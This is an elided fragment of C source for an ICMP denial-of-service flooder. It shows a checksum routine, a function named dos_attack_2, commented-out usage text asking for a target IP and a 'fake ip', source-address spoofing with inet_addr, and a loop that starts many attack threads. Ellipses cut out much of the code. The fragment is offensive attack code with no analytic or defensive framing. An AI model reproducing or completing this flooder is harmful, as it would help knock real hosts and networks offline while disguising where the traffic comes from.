...
u_short checksum_2(u_short *buf, int len) {
...
void dos_attack_2(void) {
    ...
    icmp_header->icmp_cksum = checksum_2((u_short *)icmp_header, sizeof(struct icmp) + PAYLOAD_SIZE);
...
//const char *fake_ip = (char*)malloc(20);

    // error tips
    //printf("Dos Attack: Type 2, fakeip dos.\n\n");
    //printf("Usage:\n");
    //printf("<target ip> <fake ip>\n");
    //scanf("%s %s", target_ip, fake_ip);

    // set src and dst ip
    src_ip = inet_addr(fake_ip);
    ...
    for (i = 0; i < MAX_THREAD; i++) {
        error_code = pthread_create(&attack[i], NULL, (void*)dos_attack_2, NULL);
        if (error_code != 0)
